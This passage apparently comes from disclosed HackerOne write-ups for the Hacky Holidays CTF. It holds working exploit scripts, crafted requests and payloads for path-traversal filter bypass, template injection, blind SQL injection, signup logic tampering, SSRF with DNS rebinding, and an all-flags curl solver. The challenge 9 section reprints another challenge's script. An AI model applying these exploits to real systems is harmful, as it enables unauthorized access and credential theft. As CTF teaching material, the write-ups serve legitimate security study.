The values were imported from the entries.html file through the template GET parameter, as shown in the previous image. The parameter was a strong indicator of a possible path traversal vulnerability to read further files from the webserver filesystem. Trying with some arbitrary value for the template parameter, a redirect was performed on the original challenge webpage. 

{F1140351}

Another thing I thought was to read the sourcecode of known files (such as the index.php file). In that case, the read was successful.

{F1140352}

Following the sourcecode of the index.php file, together with a short explanation of what it did. 

```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

The "template" GET parameter was assigned to the page variable. Afterwards, a regex was performed on that variable to remove any character that was not alphanumeric or the dot, plus any occurences of "admin.php" and "secretadmin.php" were removed. Finally, the content of the file passed in the page variable was read. The first interesting thing in this code was the possibility to read files from the web server current folder. The second thing was this comment, which exposed the name of the admin file "secretadmin.php".

//I've changed the admin file to secretadmin.php for more security!

After some trial and error I managed to find a bypass for the checks performed in the code with the following payload.

secretadmsecretadadmin.phpmin.phpin.php

- The first check is passed as the string contains only alphanumeric characters and dots
- The second check transform the string in:
	- secretadmsecretadmin.phpin.php
- The third check transform the string in:
	- secretadmin.php

{F1140353}

The content of the secretadmin.php file is read and the flag is returned inside the webpage.
Flag: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

The following Python script exploits the vulnerability and retrieve the flag:

```
#!/usr/bin/python3
import requests
import re

if __name__ == "__main__":
    print("[*] Challenge 6")
    url = "https://hackyholidays.h1ctf.com/my-diary/?template=index.php"
    r = requests.get(url)
    print("="*30)
    print("index.php source")
    print("="*30)
    print(r.text)
    print("="*30)
    payload = "secretadmsecretadadmin.phpmin.phpin.php"
    url = "https://hackyholidays.h1ctf.com/my-diary/? template={}".format(payload)
    r = requests.get(url)
    r1 = re.findall(r"flag\{[\w-]+\}",r.text)
    print("[*] Flag: {}".format(r1[0]))
```

#Challenge 7
The seventh challenge was accessible by browsing https://hackyholidays.h1ctf.com/hate-mail-generator. The challenge contained email campaigns and a section to create new ones.

{F1140354}

Clicking on the only available email campaigns brought me on https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030

{F1140355}

This seemed like a template injection vulnerability. Also, from the existing campaign it is possible to notice that templates are imported using {{template:PAYLOAD}}. The following endpoint allowed to preview new campaigns (creation was disabled as credits were required).
https://hackyholidays.h1ctf.com/hate-mail-generator/new

{F1140356}
{F1140357}

Some I knew some templates were already used in one of the campaign, I performed a directory bruteforce with a custom wordlist to find possible interesting folders. I discovered that the /templates directory was accessible and listable.

{F1140358}
{F1140359}

This directory contained another template file, 38dhs_admins_only_header.html, which was not directly accessible. However, I used the {{template:PAYLOAD}} statement to load this template in the preview of new campaign. The following request was made:

```
POST /hate-mail-generator/new/preview HTTP/1.1 
Host: hackyholidays.h1ctf.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 105 
preview_markup={{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"test"}
```

{F1140360}

Flag: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}

#Challenge 8
The eight challenge was accessible by browsing https://hackyholidays.h1ctf.com/forum. The challenge contained some forum threads and a login panel.

{F1140361}
{F1140362}

This was an OSINT challenge, but I spent a lot of time finding where to start. I discovered that the challenges were created by Adam Tlangley, therefore I inspected his Github profile https://github.com/adamtlangley. 

{F1140363}

 This contained a commit to the repository Grinch-Network/forum (similar name to the challenge).

As it is usually done in similar challenges, I inspected the previous commits to identify significant differences. It turned out that some credentials where removed from a .php file here https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

{F1140366}

forum:6HgeAZ0qC9T6CQIqJpD
They were some sort of database credentials but initially I did not have any idea about where to use them. 

Later I performed a directory bruteforce on the /forum endpoints using Burp "Content-Discovery". I discovered that an instance of phpmyadmin was accessible on the /forum endpoint, and that the previous credentials allowed to retrieve data from the database.

{F1140367}
{F1140368}
{F1140369}

From the database, it was possible to dump two hashed credentials. One belonged to an admin user.
grinch	35D652126CA1706B59DB02C93E0C9FBF // Admin
max	388E015BC43980947FCE0E5DB16481D1
The passwords appeared to be hashed in md5. I used this site https://www.md5online.org/md5-decrypt.html to perform a bruteforce of the hash and retrieve the original password: BahHumbug.

{F1140370}

The found credential (grinchBahHumbug) was used to log in into the forum login panel. 

{F1140371}

The new "Secret Plans" section contained a thread with the flag.

{F1140372}

Flag: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}

#Challenge 9
The ninth challenge was accessible by browsing https://hackyholidays.h1ctf.com/evil-quiz. The challenge contained some quiz questions and a final tab showing the obtained score. There was also an admin login panel which required a username and password. 
From this challenge on things got interesting and evil!  

{F1140373}

The suspicious thing in this challenge was the statement on the "Score" tab, reporting "There is DD other player(s) with the same name as you!". 

{F1140374}

If not properly checked server-side, this statement could have performed a query on the database with user-supplied input in the Your Name field of the "Your Name" tab.
A simple test confirms the assumption.
{F1140375}
{F1140376}
This was a blind sql injection having the injection point on https://hackyholidays.h1ctf.com/evil-quiz and the query result on https://hackyholidays.h1ctf.com/evil-quiz/score , and the goal was to retrieve the admin credentials from the database. I ended up writing a python3 script which exploit the vulnerability, to dump the database name, the table names, the columns names and finally retrieve the credentials.

```
#!/usr/bin/python3

import requests, time, urllib3
import re
from bs4 import BeautifulSoup

if __name__ == "__main__": 
    print("[*] Challenge 11 - Identify endpoints")
    with open("api_object_lowercase.txt") as f:
        for endpoint in f:
            session = requests.session()
            x = endpoint.rstrip()
            burp0_url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/{}%27--%20-%22,1,2--%20-".format(x)
            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
            r = session.get(burp0_url, headers=burp0_headers)
            soup = BeautifulSoup(r.text)
            l = soup.find_all("img", {"class": "img-responsive"})
            p = l[2]["src"]
            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
            r = session.get(burp0_url, headers=burp0_headers)
            if "Expected" not in r.text:
                print("/{} is available".format(x))
```

admin:S3creT_p4ssw0rd-$

Finally, I used the found credentials to login into the admin panel. The resulting webpage contained the flag.

{F1140379}

Flag: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}

#Challenge 10
The tenth challenge was accessible by browsing https://hackyholidays.h1ctf.com/signup-manager/. The challenge contained a signup and a login form in its main webpage.

{F1140380}

A first dir bruteforce on signup-manager/ revealed the following interesting ZIP file.
https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip

{F1140381}

The ZIP file contained the source code of the application.

{F1140382}

Of all the previous files, the interesting code was inside index.php

```
<?php
if( isset($_GET["logout"]) ){
    setcookie('token',null,time()-3600);
    header("Location: ".explode("?",$_SERVER["REQUEST_URI"])[0]);
    exit();
}
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
$all_users = buildUsers();
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
if( $page == 'signup.php' ) {
    $errors = array();
    if (isset($_POST["action"])) {
        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
            if( isset($all_users[ $_POST["username"] ]) ){
                $u = $all_users[ $_POST["username"] ];
                if( md5($_POST["password"]) === $u["password"] ){
                    setcookie('token', $u["cookie"], time() + 3600);
                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                    exit();
                }
            }
            $errors[] = 'Username and password combination not found';
        }
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
include_once($page);
```

When performing a new sign up, the code checked for some constraint on the POST parameters and returned an error in case they were not respected. Furthermore, if all the constraints were satisfied the PHP file created a new user inside the users.txt file. To create an admin user, it was necessary to have an "Y" as last character in the relative user text file line. Therefore, if it was possible to bypass one of the performed check and add more characters, it would have been possible to tamper the application logic and create a new user line with the "Y" character at the end.  The vulnerable check resulted in the following one. 

```
if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
```

In this case, the previous lines turned a value like 1e5 (of exactly three characters) into 100000.  Therefore, when a new user was added, it was possible to play with the firstname and lastname POST parameters to insert some Y at the end.  The line would have then been stripped to 113 characters with the last statement. 

```
$line .= str_pad( $age,3,"#");
$line .= str_pad( $firstname,15,"#");
$line .= str_pad( $lastname,15,"#");
$line .= 'N';
$line = substr($line,0,113);
```

A working HTTP payload was the following:
```
POST /signup-manager/ HTTP/1.1 
Host: hackyholidays.h1ctf.com 
Connection: close 
Content-Length: 122 
Cache-Control: max-age=0 
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87" 
sec-ch-ua-mobile: ?0 
Upgrade-Insecure-Requests: 1 
Origin: https://hackyholidays.h1ctf.com 
Content-Type: application/x-www-form-urlencoded 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
Sec-Fetch-Site: same-origin 
Sec-Fetch-Mode: navigate 
Sec-Fetch-User: ?1 
Sec-Fetch-Dest: document 
Referer: https://hackyholidays.h1ctf.com/signup-manager/ 
Accept-Encoding: gzip, deflate 
Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5 

action=signup&username=BYYYYYYYYYYYYYY&password=BYYYYYYYYYYYYYY&age=1e5&firstname=AYYYYYYYYYYYYYY&lastname=AYYYYYYYYYYYYYY
```

This created a new admin user having username and password equals to BYYYYYYYYYYYYYY.
Accessing the login panel using those credentials returned the flag and a link to the next challenge.

{F1140383}

Flag: flag{99309f0f-1752-44a5-af1e-a03e4150757d}

#Challenge 11 (Welcome to the inception dream)
Challenge 11 was accessible by browsing https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59. The challenge contained a list of albums with some pics and a login form. This challenge was very hard and required multiple steps to be fully exploited. 

{F1140384}

1 - Initial recon
An initial recon on the r3c0n_server_4fdk59/ endpoint with Burp "Content Discovery" allowed me to discover the /api endpoint. 

{F1140385}

However, the webserver returned the following error message when trying to access to an API. 

```
{"error":"This endpoint cannot be visited from this IP address"}
```

2 - SQL Injection hash parameter
The hash parameter in https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash= was vulnerable to a Blind AND SQL Injection vulnerability. The following test confirms the vulnerability:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%204127=4127%20AND%20%27hIVa%27=%27hIVa

{F1140386}

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27%20AND%204127=4127%20AND%20%27hIVa%27=%27test

{F1140387}

Also, a UNION payload is feasible to exploit the vulnerability
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8783%27%20UNION%20ALL%20SELECT%20NULL,NULL,database()--%20-

{F1140388}

However dumping the data with SQLMAP did not return anything useful

{F1140389}

3 - SQL Injection Inception
Finally, I discovered that in order to successfully call the API, it was necessary to forge an appropriate request directly from the webserver. The images available on the web application were generated from the webserver using a secret hash.

{F1140390}

By tampering the image parameter with a custom endpoint, the following error message was returned by the webserver.

{F1140391}
{F1140393}

What I discovered was that it was possible to exploit the image generation process and the SQL Injection to craft valid hashes for an arbitrary endpoint.
The following payload demonstrates the scenario, which create a valid hash and provides a link for the /api endpoint.

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27api%27--%20-%22,1,2--%20-

Which results in the following response from the webserver.

{F1140394}

4 - API bruteforce
I understood that the /api endpoint was in the parent directory, so I tried with the ../api value.

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api%27--%20-%22,1,2--%20-

{F1140395}

This means that the /api endpoint was successfully reached, but the content-type is not valid. I created a script to discover additional endpoints by bruteforcing the /api folder.

```
#!/usr/bin/python3

import requests, time, urllib3
import re
from bs4 import BeautifulSoup

if __name__ == "__main__": 
    print("[*] Challenge 11 - Identify endpoints")
    with open("api_object_lowercase.txt") as f:
        for endpoint in f:
            session = requests.session()
            x = endpoint.rstrip()
            burp0_url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/{}%27--%20-%22,1,2--%20-".format(x)
            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
            r = session.get(burp0_url, headers=burp0_headers)
            soup = BeautifulSoup(r.text)
            l = soup.find_all("img", {"class": "img-responsive"})
            p = l[2]["src"]
            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
            r = session.get(burp0_url, headers=burp0_headers)
            if "Expected" not in r.text:
                print("/{} is available".format(x))
```

5 - Credentials wildcard bruteforce
I found out that the /user endpoint was accessible using that method. Then I tried to find some GET parameters to pass to the URL in order to retrieve credentials using the /user API. I noticed that the "username" GET parameter allowed to perform queries, and furthermore it was possible to perform a bruteforce on the username by using the "%" wildcard character and a comparison of the response to check the right character. The following script performs this scenario to retrieve the username.

```
#!/usr/bin/python3

import requests, time
import re
from bs4 import BeautifulSoup

if __name__ == "__main__": 
    letters = "abcdefghijklmnopqrstuvwxyz1234567890_-$"
    username = ""
    found = False
    for l in range(1,40):
        found = False
        for o in letters:
            session = requests.session()
            burp0_url = "https://hackyholidays.h1ctf.com:443/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/user?username={}%25%27--%20-%22,%22%22,%22NO!%22--%20-".format(username+o)
            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
            r = session.get(burp0_url, headers=burp0_headers)
            soup = BeautifulSoup(r.text)
            l = soup.find_all("img", {"class": "img-responsive"})
            p = l[2]["src"]
            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
            r = session.get(burp0_url, headers=burp0_headers)
            if "Expected" not in r.text:
                username = username + o
                print("Username till now {}".format(username))
                found = True
                break
        if found is False:
            break
```

After having retrieved the username, I used the same process to retrieve the password using the GET password parameter. Following the script to retrieve the password.

```
#!/usr/bin/python3

import requests, time
import re
from bs4 import BeautifulSoup

if __name__ == "__main__": 
    letters = "abcdefghijklmnopqrstuvwxyz1234567890_-$"
    password = ""
    found = False
    for l in range(1,40):
        found = False
        for o in letters:
            session = requests.session()
            burp0_url = "https://hackyholidays.h1ctf.com:443/r3c0n_server_4fdk59/album?hash=b%27%20UNION%20ALL%20SELECT%20%221%27%20UNION%20ALL%20SELECT%20%27c%27,%27b%27,%27../api/user?password={}%25%27--%20-%22,%22%22,%22NO!%22--%20-".format(password+o)
            burp0_headers = {"Connection": "close", "Content-Type":"application/json","Cache-Control": "max-age=0", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "*/*", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
            r = session.get(burp0_url, headers=burp0_headers)
            soup = BeautifulSoup(r.text)
            l = soup.find_all("img", {"class": "img-responsive"})
            p = l[2]["src"]
            burp0_url = "https://hackyholidays.h1ctf.com{}".format(p)
            r = session.get(burp0_url, headers=burp0_headers)
            if "Expected" not in r.text:
                password = password + o
                print("Password till now {}".format(password))
                found = True
                break
        if found is False:
            break
```

The process resulted in the following credentials: 

grinchadmin / s4nt4sucks

Then, I used those credentials to login into the "Attack Box", where the flag was stored.

{F1140396}

Flag: flag{07a03135-9778-4dee-a83c-7ec330728e72}

#Challenge 12
Challenge 12 was accessible by browsing https://hackyholidays.h1ctf.com/attack-box. The challenge contained some IPs to attack clicking on a button.

{F1140397}

Clicking on one of the attack buttons performed a request similar to the following.
```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```
The base64 payload contained the following value:

{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}

By trying to tamper the target value, the webserver returned the following error.

{F1140398}
{F1140399}

It was necessary to bruteforce the hash order to generate new md5 hashes and arbitrary target properties. I used hashcat and the rockyou.txt wordlist for this purpose. Hashcat mode 10 was used, namely md5($pass.$salt). The bruteforce was successful and the secret value resulted to be: mrgrinch463. Afterwards, I created a script to generate new hashes and start attacks with arbitrary target values.

```
import hashlib,requests,base64,json
import urllib.parse
import webbrowser
import time

if __name__ == "__main__":
	while True:
		ip = "470631266f2a4f108432eff944f33ed6.gel0.space"
		bytes1 = str.encode("mrgrinch463{}".format(ip))
		hash1 = hashlib.md5(bytes1).hexdigest()
		print("[*] Hash is {}".format(hash1))
		payload = {"target":ip,"hash":hash1}
		payload_str = json.dumps(payload)
		payload1 = base64.b64encode(str.encode(payload_str))
		print(payload1)
		payload1_1 = {'payload':payload1}
		payload2 = urllib.parse.urlencode(payload1_1,safe=':+') 
		burp0_url = "https://hackyholidays.h1ctf.com:443/attack-box/launch"
		burp0_cookies = {"attackbox": "d09d508e78f3975e0199a5e91dde9687"}
		burp0_headers = {"Connection": "close", "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://hackyholidays.h1ctf.com/attack-box", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,zh-CN;q=0.6,zh;q=0.5"}
		r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=payload2,allow_redirects=False)
		url = r.headers['Location']
		webbrowser.open_new("https://hackyholidays.h1ctf.com"+url)
		time.sleep(15)
```

However, when trying to put loopback values as target value, the server returned an error message.

{F1140400}

I tried with some bypass (already common for SSRF attacks) but they were not successful. Afterwards, I tried to perform a DNS Rebinding attack to bypass the local IP address check, by putting the 470631266f2a4f108432eff944f33ed6.gel0.space hostname inside the script.
The webserver redirected me on the final competition webpage containing the flag.

{F1140422}

flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

## Impact

N/A

---

### [Grinch Networks compromised!](https://hackerone.com/reports/1066504)

- **Report ID:** `1066504`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @zonduu
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:06:15.458Z
- **CVE(s):** -

**Vulnerability Information:**

# Grinch Networks compromised!

For fast triage/validation and inspired by @manoelt in other CTF, I made a bash script to find and print all the 12 flags of this CTF.

The script uses curl, wget, google-chrome headless (for flag 2), unzip, grep and sed. If any of these commands is missing, the script might crash or not get all the flags.

```bash
echo -e "NOTE: This script uses: curl, wget, google-chrome headless, unzip, grep and sed. if any of this is missing, the script might not run well\n";

echo -e "[*] Getting all flags...\n";

## Flag 1

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/robots.txt' | grep "flag[^ ]*" -o | sed 's/^/Flag 1\: /';

## Flag 2 - Needs chrome headless browser.

google-chrome --headless --disable-gpu --dump-dom https://hackyholidays.h1ctf.com/s3cr3t-ar3a --no-sandbox | egrep -o "flag\{[a-zA-Z0-9\-]*}" | sed 's/^/Flag 2\: /';

## Flag 3

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0g' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 3\: /';

## Flag 4

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' -H $'Connection: close' $'https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 4\: /';

## Flag 5 - this one is a bit hard. uses 'unzip' to unzip the file, reads it and then deletes everything.

wget 'https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip' 2> /dev/null;
unzip -P "hahahaha" my_secure_files_not_for_you.zip &> /dev/null;
cat flag.txt | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 5\: /';
rm flag.txt xxx.png my_secure_files_not_for_you.zip;

## Flag 6

curl -i -s -k -X $'GET' -H $'Host: hackyholidays.h1ctf.com' $'https://hackyholidays.h1ctf.com/my-diary/?template=secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php' | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 6\: /';

## Flag 7

curl -X POST -s -k -d "preview_markup=Hello+%7B%7Bflag%7D%7D&preview_data=%7B%22flag%22%3A%22%7B%7Btemplate:38dhs_admins_only_header.html%7D%7D%22%7D" "https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview" | egrep "flag\{[a-zA-Z0-9\-]*}" -o | sed 's/^/Flag 7\: /';

## Flag 8

cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 34'     --data-binary $'username=grinch&password=BahHumbug'     $'https://hackyholidays.h1ctf.com/forum/login' | egrep "token[^ ]*" -o);
curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/forum/3/2' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 8\: /';

## Flag 9

curl 'https://hackyholidays.h1ctf.com/evil-quiz/admin' -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "username=admin&password=S3creT_p4ssw0rd-%24" -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o  | sed 's/^/Flag 9\: /';

## Flag 10

cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com' -H $'Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 47' -H $'Upgrade-Insecure-Requests: 1'     --data-binary $'action=login&username=zonduupoc&password=123123'     $'https://hackyholidays.h1ctf.com/signup-manager/' | egrep "token[^ ]*" -o);
curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/signup-manager/' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 10\: /';

## Flag 11

cookie=$(curl -i -s -k -X $'POST'     -H $'Host: hackyholidays.h1ctf.com' -H $'Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 40' -H $'Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687' -H $'Upgrade-Insecure-Requests: 1'     -b $'attackbox=d09d508e78f3975e0199a5e91dde9687'     --data-binary $'username=grinchadmin&password=s4nt4sucks'     $'https://hackyholidays.h1ctf.com/attack-box/login' | egrep "attackbox[^ ]*" -o)
curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/attack-box' -s -k |  egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 11\: /';

## flag 12
